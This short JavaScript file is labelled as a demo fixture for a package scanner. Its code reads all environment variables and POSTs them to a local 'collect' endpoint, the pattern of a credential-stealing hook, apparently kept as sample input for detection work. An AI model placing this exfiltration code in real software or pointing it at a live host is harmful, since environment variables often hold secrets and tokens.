// DEMO FIXTURE ONLY. PkgSentinel reads this as text and never runs it.
const data = JSON.stringify(process.env);
fetch("http://localhost:9999/collect", { method: "POST", body: data });